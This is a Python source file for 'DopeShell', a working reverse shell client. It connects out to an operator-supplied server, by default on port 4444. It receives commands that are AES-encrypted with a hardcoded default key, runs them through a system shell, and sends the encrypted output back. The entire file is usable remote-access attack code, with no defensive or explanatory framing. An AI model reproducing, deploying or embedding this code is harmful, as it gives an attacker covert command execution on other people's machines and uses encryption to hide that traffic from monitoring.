# dopeshell/client.py

import socket
import subprocess
import os
import base64
import argparse
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

class DopeShellclient:
    def __init__(self, server_ip, server_port, key):
        self.server_ip = server_ip
        self.server_port = server_port
        self.key = key
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def encrypt(self, data):
        iv = os.urandom(16)
        cipher = Cipher(algorithms.AES(self.key), modes.CFB(iv), backend=default_backend())
        encryptor = cipher.encryptor()
        encrypted_data = iv + encryptor.update(data) + encryptor.finalize()
        return base64.b64encode(encrypted_data)

    def decrypt(self, data):
        data = base64.b64decode(data)
        iv = data[:16]
        cipher = Cipher(algorithms.AES(self.key), modes.CFB(iv), backend=default_backend())
        decryptor = cipher.decryptor()
        decrypted_data = decryptor.update(data[16:]) + decryptor.finalize()
        return decrypted_data

    def execute_command(self, command):
        try:
            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        except subprocess.CalledProcessError as e:
            output = e.output
        return output

    def run(self):
        self.sock.connect((self.server_ip, self.server_port))
        while True:
            command = self.decrypt(self.sock.recv(4096)).decode('utf-8')
            if command.lower() == 'exit':
                break
            output = self.execute_command(command)
            self.sock.send(self.encrypt(output))
        self.sock.close()

def main():
    parser = argparse.ArgumentParser(description="DopeShell Reverse Shell Client")
    parser.add_argument("--server-ip", type=str, required=True, help="IP address of the server to connect to")
    parser.add_argument("--server-port", type=int, default=4444, help="Port of the server to connect to (default: 4444)")
    parser.add_argument("--key", type=str, default="myverystrongpasswordo32bitlength", help="Encryption key (32 bytes)")

    args = parser.parse_args()

    key = args.key.encode("utf-8")
    client = DopeShellclient(args.server_ip, args.server_port, key)
    client.run()

#main function
if __name__ == "__main__":
    main()